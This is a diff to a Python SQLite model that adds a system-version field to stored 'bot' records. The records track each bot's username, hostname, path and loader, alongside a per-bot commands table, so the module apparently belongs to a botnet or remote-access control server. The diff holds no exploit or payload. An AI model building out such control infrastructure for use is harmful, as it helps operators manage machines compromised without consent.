@@ -52,12 +52,13 @@ class Bot:
     """This class represents a bot."""
 
     def __init__(self, bot_uid: str, username: str, hostname: str, last_online: float,
-                 local_path: str, loader_name: str):
+                 local_path: str, system_version: str, loader_name: str):
         self.uid = bot_uid
         self.username = username
         self.hostname = hostname
         self.last_online = last_online
         self.local_path = local_path
+        self.system_version = system_version
         self.loader_name = loader_name
 
 
@@ -83,6 +84,7 @@ class Model:
                              "hostname text, "
                              "last_online real, "
                              "local_path text, "
+                             "system_version text, "
                              "loader_name text)")
         self._cursor.execute("CREATE TABLE commands("
                              "bot_uid text, "
@@ -100,9 +102,9 @@ class Model:
     def add_bot(self, bot: Bot):
         """Adds a bot to the database."""
         with self._lock:
-            self._cursor.execute("INSERT INTO bots VALUES(?,?,?,?,?,?)", (
+            self._cursor.execute("INSERT INTO bots VALUES(?,?,?,?,?,?,?)", (
                 bot.uid, bot.username, bot.hostname, bot.last_online,
-                bot.local_path, bot.loader_name
+                bot.local_path, bot.system_version, bot.loader_name
             ))
             self._database.commit()
 
@@ -117,7 +119,7 @@ class Model:
         """:return The bot object of the given UID."""
         with self._lock:
             response = self._cursor.execute("SELECT * FROM bots WHERE bot_uid = ? LIMIT 1", (bot_uid,)).fetchone()
-            return Bot(response[0], response[1], response[2], response[3], response[4], response[5])
+            return Bot(response[0], response[1], response[2], response[3], response[4], response[5], response[6])
 
     def remove_bot(self, bot_uid: str):
         """Removes the bot from the database."""
@@ -142,7 +144,7 @@ class Model:
             response = self._cursor.execute("SELECT * FROM bots LIMIT ? OFFSET ?", (limit, skip_amount))
 
             for row in response:
-                bots.append(Bot(row[0], row[1], row[2], row[3], row[4], row[5]))
+                bots.append(Bot(row[0], row[1], row[2], row[3], row[4], row[5], row[6]))
 
             return bots
 
